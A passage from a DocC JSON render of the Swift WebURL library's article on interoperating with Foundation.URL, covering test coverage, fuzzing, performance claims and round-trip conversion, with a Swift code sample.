","type":"text"},{"type":"emphasis","inlineContent":[{"type":"text","text":"hundreds"}]},{"text":" of additional","type":"text"},{"text":" ","type":"text"},{"text":"tests, covering every aspect of its API. Currently our coverage is about 88% (generally regarded as excellent),","type":"text"},{"text":" ","type":"text"},{"text":"and the gaps are mostly things that can’t easily be tested in Swift (assertion failures and the like).","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"And if ","type":"text"},{"inlineContent":[{"text":"all of that","type":"text"}],"type":"emphasis"},{"text":" wasn’t enough, ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" is regularly fuzz-tested, as are the URL type conversions.","type":"text"},{"text":" ","type":"text"},{"text":"Fuzzing is an incredibly powerful technique that discovers bugs programmers wouldn’t typically think to search for.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"All of this means that you can have confidence adopting ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" ","type":"text"},{"inlineContent":[{"text":"right now","type":"text"}],"type":"emphasis"},{"text":".","type":"text"},{"text":" ","type":"text"},{"text":"It is everything you would expect from a production-quality URL library.","type":"text"}]}]},{"content":[{"inlineContent":[{"text":"🔥 It’s blazing fast.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"code":"WebURL","type":"codeVoice"},{"text":" is regularly benchmarked, and comes out faster than ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" for ","type":"text"},{"inlineContent":[{"type":"text","text":"every"}],"type":"emphasis"},{"text":" operation;","type":"text"},{"text":" ","type":"text"},{"text":"whether you’re parsing URL strings, modifying components, iterating through the path, etc.","type":"text"},{"text":" ","type":"text"},{"text":"In particular, it is orders of magnitude faster on low-end\/IoT platforms like the Raspberry Pi,","type":"text"},{"text":" ","type":"text"},{"text":"enabling applications which were previously so slow they’d be impractical.","type":"text"}],"type":"paragraph"}]}],"type":"orderedList"},{"anchor":"A-Note-on-Round-Tripping","type":"heading","text":"A Note on Round-Tripping","level":2},{"inlineContent":[{"type":"text","text":"Round-tripping refers to taking a value in one type (say "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"), converting it to another type ("},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":"),"},{"type":"text","text":" "},{"type":"text","text":"and then converting back to the original type (to "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" again). This is a useful property for some libraries"},{"type":"text","text":" "},{"type":"text","text":"and data structures."}],"type":"paragraph"},{"items":[{"content":[{"inlineContent":[{"type":"text","text":"A "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" which can be converted to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" value can "},{"type":"strong","inlineContent":[{"text":"always","type":"text"}]},{"type":"text","text":" be converted back to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"A "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" which can be converted to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" can "},{"inlineContent":[{"type":"text","text":"almost always"}],"type":"strong"},{"type":"text","text":" be converted back to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":"."}]},{"type":"aside","style":"note","content":[{"type":"paragraph","inlineContent":[{"text":"","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"There is one, very rare situation where a Foundation -> WebURL conversion cannot be converted back:","type":"text"},{"text":" ","type":"text"},{"text":"HTTP URLs whose hostnames contain percent-encoded special characters. These will get decoded by ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":",","type":"text"},{"text":" ","type":"text"},{"text":"but can’t be re-encoded for the conversion back to Foundation.","type":"text"}]},{"type":"codeListing","syntax":"swift","code":["(Foundation \"http:\/\/te%7Bs%7Dt\/\") -> (WebURL \"http:\/\/te{s}t\/\") -> (Rejected by Foundation)","                      ^^^ ^^^                          ^ ^"]},{"type":"paragraph","inlineContent":[{"type":"text","text":"It is worth noting that these are not valid DNS domain names, so this is mostly a theoretical concern."},{"type":"text","text":" "},{"type":"text","text":"Generally, you should assume that Foundation -> WebURL conversions can be converted back to "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"s."}]}]}]}],"type":"unorderedList"},{"inlineContent":[{"text":"Sometimes, percent-encoding needs to be added when converting a ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" to Foundation; this means the round-trip","type":"text"},{"text":" ","type":"text"},{"text":"result will not be equal to the original ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" value. Use the ","type":"text"},{"type":"codeVoice","code":"WebURL.encodedForFoundation"},{"text":" property to add","type":"text"},{"text":" ","type":"text"},{"text":"percent-encoding in advance; if the result of that property can be converted to a ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":", it is guaranteed","type":"text"},{"text":" ","type":"text"},{"text":"to round-trip to an identical ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" value.","type":"text"}],"type":"paragraph"},{"code":["func processURL(_ webURL: WebURL) throws {","","  let encodedWebURL = webURL.encodedForFoundation","  \/\/ ℹ️                     ^^^^^^^^^^^^^^^^^^^^^","  \/\/ Percent-encoding is added by default when converting to Foundation.","  \/\/ If we do it now, we know it will round-trip back to 'encodedWebURL'.","","  guard let convertedURL = URL(encodedWebURL) else { throw InvalidURLError() }","","  \/\/ Do some stuff with Foundation...","  let dataTask = URLSession.shared.dataTask(from: convertedURL)","  let urlFromDataTask = dataTask.originalRequest!.url!","","  \/\/ ✅ A converted WebURL can always convert back. ","  let roundtripWebURL = WebURL(urlFromDataTask)!","","  \/\/ ✅ The round-trip result is identical to 'encodedWebURL'. ","  assert(encodedWebURL == roundtripWebURL)","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"type":"text","text":"It is not generally possible to know in advance what the result of a "},{"code":"{Foundation -> WebURL -> Foundation}","type":"codeVoice"},{"type":"text","text":" round-trip"},{"type":"text","text":" "},{"type":"text","text":"will be. There is no equivalent of "},{"code":"WebURL.encodedForFoundation","type":"codeVoice"},{"type":"text","text":" which normalizes a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}],"type":"paragraph"}]}],"abstract":[{"text":"Best practices when mixing URL standards","type":"text"}],"metadata":{"roleHeading":"Article","title":"Using WebURL with Foundation","modules":[{"name":"WebURL"}],"role":"article"},"kind":"article","references":{"doc://com.karwa.WebURL/documentation/WebURL/WebURL/pathComponents-swift.property":{"abstract":[{"type":"text","text":"A read-write view of the URL’s path components."}],"kind":"symbol","title":"pathComponents","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/pathComponents-swift.property","role":"symbol","fragments":[{"text":"var","kind":"keyword"},{"text":" ","kind":"text"},{"text":"pathComponents","kind":"identifier"},{"text":": ","kind":"text"},{"text":"WebURL","kind":"typeIdentifier","preciseIdentifier":"s:6WebURLAAV"},{"text":".","kind":"text"},{"text":"PathComponents","kind":"typeIdentifier","preciseIdentifier":"s:6WebURLAAV14PathComponentsV"}],"type":"topic","url":"\/documentation\/weburl\/weburl\/pathcomponents-swift.property"},"doc://com.karwa.WebURL/documentation/WebURL":{"role":"collection","url":"\/documentation\/weburl","abstract":[{"text":"A new URL type for Swift.","type":"text"}],"title":"WebURL","type":"topic","kind":"symbol","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL"},"https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/":{"title":"recently-disclosed vulnerability","type":"link","url":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","titleInlineContent":[{"type":"text","text":"recently-disclosed vulnerability"}]},"doc://com.karwa.WebURL/documentation/WebURL/WebURL/utf8":{"title":"utf8","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/utf8","fragments":[{"text":"var","kind":"keyword"},{"text":" ","kind":"text"},{"text":"utf8","kind":"identifier"},{"text":": ","kind":"text"},{"preciseIdentifier":"s:6WebURLAAV","text":"WebURL","kind":"typeIdentifier"},{"text":".","kind":"text"},{"preciseIdentifier":"s:6WebURLAAV8UTF8ViewV","text":"UTF8View","kind":"typeIdentifier"}],"kind":"symbol","abstract":[{"type":"text","text":"A read-write view of the serialized URL’s UTF-8 code-units."}],"url":"\/documentation\/weburl\/weburl\/utf8","type":"topic","role":"symbol"},"doc://com.karwa.WebURL/documentation/WebURL/WebURL/formParams":{"kind":"symbol","url":"\/documentation\/weburl\/weburl\/formparams","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/formParams","title":"formParams","abstract":[{"text":"A read-write view of the URL’s form-encoded query parameters.","type":"text"}],"role":"symbol","type":"topic","fragments":[{"text":"var","kind":"keyword"},{"text":" ","kind":"text"},{"text":"formParams","kind":"identifier"},{"text":": ","kind":"text"},{"text":"WebURL","preciseIdentifier":"s:6WebURLAAV","kind":"typeIdentifier"},{"text":".","kind":"text"},{"text":"FormEncodedQueryParameters","preciseIdentifier":"s:6WebURLAAV26FormEncodedQueryParametersV","kind":"typeIdentifier"}]}}}